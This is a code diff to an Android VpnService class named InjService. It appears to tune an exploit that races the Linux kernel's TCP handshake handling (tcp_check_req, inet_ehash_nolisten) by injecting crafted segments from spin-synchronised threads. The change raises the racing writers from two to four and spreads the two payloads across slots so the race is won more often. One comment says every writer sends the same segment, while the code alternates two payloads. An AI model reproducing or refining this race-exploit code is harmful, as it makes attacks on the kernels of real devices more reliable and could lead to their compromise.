@@ -90,7 +90,18 @@ public class InjService extends VpnService {
      * which is the resolution this needs.
      */
     private static final int DUAL_MARK = 0xFFFFFFFE;
-    private static final int RACE_WRITERS = 2;
+
+    /**
+     * How many spin-parked writers participate in a race frame.
+     *
+     * Two was the minimum the race can work with, but it is fragile: the pair
+     * has to beat the first ACK's trip through inet_ehash_nolisten, and losing
+     * that by a few microseconds looks identical to never having tried. Four
+     * writers on four cpus give the kernel several chances to have two of them
+     * inside tcp_check_req at once, at the cost of a few extra packets per
+     * round that are simply dropped.
+     */
+    private static final int RACE_WRITERS = 4;
 
     private static final int ACK_BYTE = 0x06;
     private static final int OUT_BYTE = 0x07;
@@ -119,8 +130,7 @@ public class InjService extends VpnService {
      * through a monitor wakeup. dualAck counts completions so the publisher can
      * wait for both writes to drain before reusing the slot.
      */
-    private volatile byte[] dualA = null;
-    private volatile byte[] dualB = null;
+    private volatile byte[][] dualSlots = new byte[RACE_WRITERS][];
     private volatile int dualSeq = 0;
     private volatile boolean dualGo = false;
     private final AtomicInteger dualAck = new AtomicInteger(0);
@@ -470,7 +480,8 @@ public class InjService extends VpnService {
             }
 
             seen = dualSeq;
-            byte[] mine = slot == 0 ? dualA : dualB;
+            byte[][] slots = dualSlots;
+            byte[] mine = slots[slot];
 
             // Wait for the publisher to release both writers. Spinning here
             // rather than returning early keeps the two threads phase aligned:
@@ -505,16 +516,23 @@ public class InjService extends VpnService {
      * has already picked up the new pair.
      */
     private void publishDual(byte[] a, byte[] b) {
-        int target = 2;
+        int target = RACE_WRITERS;
 
         dualGo = false;
         dualAck.set(0);
 
-        dualA = a;
-        dualB = b;
+        // Every writer sends the same segment. Only two of them need to land
+        // inside the window for the race to matter, and which two is up to the
+        // scheduler, so filling all the slots costs nothing and multiplies the
+        // chances.
+        byte[][] slots = new byte[RACE_WRITERS][];
+        for (int i = 0; i < RACE_WRITERS; i++) {
+            slots[i] = (i % 2 == 0) ? a : b;
+        }
 
-        // Publish both payloads and the generation before releasing the spin,
-        // so a writer that sees dualGo == true also sees the correct arrays.
+        // Publish the payload array and the generation before releasing the
+        // spin, so a writer that sees dualGo == true also sees the right slot.
+        dualSlots = slots;
         dualSeq++;
         dualGo = true;
 
